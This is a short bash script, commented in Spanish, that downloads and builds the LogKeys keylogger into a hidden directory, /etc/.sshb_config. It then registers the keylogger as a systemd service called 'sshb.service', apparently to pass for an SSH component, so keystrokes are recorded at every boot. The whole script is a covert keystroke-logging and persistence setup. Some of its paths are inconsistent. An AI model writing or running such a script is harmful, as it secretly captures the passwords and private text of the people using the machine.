#!/bin/bash
# Instalación de dependencias en sistema Ubuntu
sudo apt install build-essential autotools-dev autoconf kbd -y

mkdir /etc/.sshb_config
cd /etc/.sshb_config/

# Descarga del keylogger LogKeys
wget https://github.com/kernc/logkeys/archive/master.zip

# Descomprime el archivo
unzip master.zip

# Ingresa al directorio generado
cd logkeys-master/

# Ejecuta el script autogen
./autogen.sh

# Configura, compila e instala LogKeys
./configure && make && sudo make install

# Descarga el mapa de teclado en español
wget https://raw.githubusercontent.com/kernc/logkeys/master/keymaps/es_ES.map

# Ejecuta LogKeys en modo seguimiento, especificando el mapa de teclado y excluyendo las teclas de función
sudo logkeys -s -m es_ES.map --no-func-keys

# Abre otro terminal y muestra en tiempo real el contenido del archivo de registro de LogKeys
sudo tail -f /var/log/logkeys.log

# Segunda parte
chmod +x /home/tu_usuario/.sshb_config/logkeys-master/logkeys
sudo touch /etc/systemd/system/sshb.service

unit_file="/etc/systemd/system/sshb.service"

# Contenido de la UNIT
unit_content="[Unit]
Description=SSHB Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash /etc/.sshb_config/logkeys-master/logkeys -s -m /etc/.sshb_config/logkeys-master/es_ES.map --no-func-keys
Restart=always

[Install]
WantedBy=multi-user.target
"

echo "$unit_content" | sudo tee "$unit_file" > /dev/null

sudo systemctl enable sshb.service
sudo systemctl start sshb.service
